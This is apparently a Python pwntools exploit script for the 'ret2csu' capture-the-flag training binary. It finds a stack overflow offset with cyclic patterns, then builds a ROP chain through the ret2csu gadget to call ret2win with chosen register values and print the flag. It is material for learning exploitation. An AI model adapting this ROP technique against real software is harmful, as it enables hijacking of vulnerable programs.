import time

from pwn import *


EXECUTABLE = "./ret2csu"
context.binary = elf = ELF(EXECUTABLE)
lib_ret2csu = ELF("./libret2csu.so")


p = process(EXECUTABLE)
if args.GDB:
    gdb.attach(p)


OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    log.success(f"Offset found: {offset}")
    exit()


# Params for the ret2win function
params = [
    0xdeadbeefdeadbeef, # rdi
    0xcafebabecafebabe, # rsi
    0xd00df00dd00df00d  # rdx
]

rop = ROP(elf)
rop.ret2csu(edi=0, rsi=params[1], rdx=params[2])
rop(rdi=params[0])
rop.call(elf.plt.ret2win)


log.debug("Sending rop chain:\n" + rop.dump())
p.sendafter(b"> ", flat({ OFFSET: rop.chain() }))
p.recvline() # Thank you

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
